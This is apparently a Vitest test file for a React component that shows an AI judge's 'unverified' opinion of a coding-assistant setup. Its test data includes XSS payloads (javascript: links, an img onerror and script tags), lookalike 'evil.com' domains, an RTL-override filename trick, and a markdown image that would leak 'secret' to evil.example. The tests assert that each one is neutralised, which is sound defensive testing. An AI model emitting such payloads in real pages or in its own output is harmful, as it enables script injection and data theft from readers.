// @vitest-environment jsdom
import { cleanup, render, screen, within } from "@testing-library/react";
import { afterEach, describe, expect, it } from "vitest";
import type { JudgeFinding, JudgeVerdict } from "../../src/judge/verdict";
import JudgeNarrative from "../../src/ui/judge-setup/JudgeNarrative";
import { cleanText, safeLink } from "../../src/ui/judge-setup/narrative";

afterEach(cleanup);

const CITATION = "https://code.claude.com/docs/en/hooks";

const FINDING: JudgeFinding = {
  title: "Stale CLAUDE.md claim",
  evidence: "claude_md: no hooks registered",
  why: "A hook is registered.",
  change: "Delete the claim.",
  check_id: "hooks_configured",
  source: null,
};

function verdict(over: Partial<JudgeVerdict> = {}): JudgeVerdict {
  return {
    verdict: "A solid setup with one stale rule.",
    findings: [FINDING],
    disagreements: [],
    cannot_judge: ["hook contents"],
    ...over,
  };
}

const CHECKS = new Map([
  ["hooks_configured", { statement: "Hooks are configured", source_url: CITATION }],
]);

function renderNarrative(v: JudgeVerdict, caps: [string, string][] = []) {
  return render(<JudgeNarrative verdict={v} checks={CHECKS} activeCaps={new Map(caps)} />);
}

describe("narrative text rules", () => {
  it("strips bidi and zero-width control characters", () => {
    expect(cleanText("ab‮cd​ef⁦g﻿", 100)).toBe("abcdefg");
  });

  it("caps length with an ellipsis", () => {
    expect(cleanText("x".repeat(50), 10)).toBe(`${"x".repeat(9)}…`);
  });

  it("links only exact citation matches or allow-listed # routes", () => {
    const allowed = [CITATION];
    expect(safeLink(CITATION, allowed)).toBe(CITATION);
    expect(safeLink(`${CITATION}.evil.com`, allowed)).toBeNull();
    expect(safeLink("https://code.claude.com.evil.com/docs/en/hooks", allowed)).toBeNull();
    expect(safeLink("javascript:alert(1)", allowed)).toBeNull();
    expect(safeLink("JaVaScRiPt:alert(1)", allowed)).toBeNull();
    expect(safeLink("#/judge-setup", allowed)).toBe("#/judge-setup");
    expect(safeLink("#/nowhere", allowed)).toBeNull();
  });
});

describe("JudgeNarrative", () => {
  it("sits in a labelled AI-opinion container", () => {
    renderNarrative(verdict());
    const region = screen.getByRole("region", { name: /AI opinion \(unverified\)/i });
    expect(within(region).getByText("A solid setup with one stale rule.")).toBeTruthy();
    expect(within(region).getByText("Stale CLAUDE.md claim")).toBeTruthy();
    expect(within(region).getByText("hook contents")).toBeTruthy();
  });

  it("renders HTML and script as inert text", () => {
    const { container } = renderNarrative(
      verdict({ verdict: '<img src=x onerror="alert(1)"><script>alert(2)</script><b>bold</b>' }),
    );
    expect(container.querySelector("img, script, b")).toBeNull();
    expect(screen.getByText(/<script>alert\(2\)<\/script>/)).toBeTruthy();
  });

  it("renders a markdown image as inert text, not an image or link", () => {
    const md = "![x](https://evil.example/?d=secret)";
    const { container } = renderNarrative(verdict({ findings: [{ ...FINDING, why: md }] }));
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector('a[href*="evil"]')).toBeNull();
    expect(screen.getByText(md)).toBeTruthy();
  });

  it("does not auto-link bare URLs, javascript: or lookalike domains", () => {
    const { container } = renderNarrative(
      verdict({
        findings: [
          {
            ...FINDING,
            why: "See https://code.claude.com.evil.com/docs and javascript:alert(1)",
            change: `Read [docs](javascript:alert(1)) and ${CITATION}.evil.com`,
          },
        ],
      }),
    );
    const hrefs = [...container.querySelectorAll("a")].map((a) => a.getAttribute("href"));
    expect(hrefs.some((h) => h?.includes("evil"))).toBe(false);
    expect(hrefs.some((h) => h?.toLowerCase().startsWith("javascript"))).toBe(false);
  });

  it("strips an RTL override from rendered text", () => {
    const { container } = renderNarrative(verdict({ verdict: "safe‮txt.exe" }));
    expect(container.textContent).not.toContain("‮");
    expect(screen.getByText("safetxt.exe")).toBeTruthy();
  });

  it("links a cited check to its scorecard row and its exact cited doc with rel noopener", () => {
    const { container } = renderNarrative(verdict());
    expect(
      container.querySelector('a[href="#/judge-setup?check=hooks_configured"]'),
    ).not.toBeNull();
    const doc = container.querySelector(`a[href="${CITATION}"]`);
    expect(doc?.getAttribute("rel")).toBe("noopener noreferrer");
    expect(container.textContent).not.toContain("hooks_configured");
  });

  it("flags an improvement that conflicts with an active cap", () => {
    renderNarrative(verdict(), [["hooks_configured", "Practitioner"]]);
    expect(screen.getByText(/conflicts with an active cap/i).textContent).toContain("Practitioner");
  });

  it("drops a check link whose id is not a plain check id", () => {
    const { container } = renderNarrative(
      verdict({ findings: [{ ...FINDING, check_id: "x&y=1" }] }),
    );
    expect(container.querySelector('a[href^="#/judge-setup"]')).toBeNull();
  });

  it("never shows tier or score styling, even when the verdict claims a tier", () => {
    const { container } = renderNarrative(
      verdict({ verdict: "This is an Elite setup, score 100/100." }),
    );
    expect(container.querySelector("[data-tone], .tier-badge, [data-score]")).toBeNull();
  });
});
